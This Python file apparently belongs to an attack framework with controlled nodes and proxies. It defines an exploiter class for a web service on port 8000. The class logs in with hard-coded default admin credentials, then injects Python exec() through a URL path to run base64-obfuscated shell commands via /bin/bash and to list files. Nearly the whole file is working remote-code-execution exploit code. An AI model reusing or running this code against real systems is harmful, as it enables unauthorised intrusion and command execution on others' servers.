import base64
import os
import sys
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


class PythonDemoExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}:8000"
        self.is_rce = True
        self.is_endpoint = True

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        proxier.send_request(
            "post",
            f"{self.prefix}/admin/login",
            json={"username": "admin", "password": "123456"},
        )

    def exploit_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd):
        encoded_cmd = self.encode_cmd(cmd)
        expr = f"""exec("import os;os.system('{encoded_cmd}')")"""
        encoded_expr = quote(expr, safe="")
        print(">", expr)
        proxier.send_request("get", f"{self.prefix}/solve/{encoded_expr}")

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        expr = """exec("import os;global a;a=os.listdir('.')")"""
        encoded_expr = quote(expr, safe="")
        print(">", expr)
        proxier.send_request("get", f"{self.prefix}/solve/{encoded_expr}")
        res = proxier.send_request("get", f"{self.prefix}/solve/a")
        print("<", res.text)


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.session = requests.Session()

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

    local_node_fake = LocalNodeFake()
    exploiter = PythonDemoExploiter("192.168.123.2")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
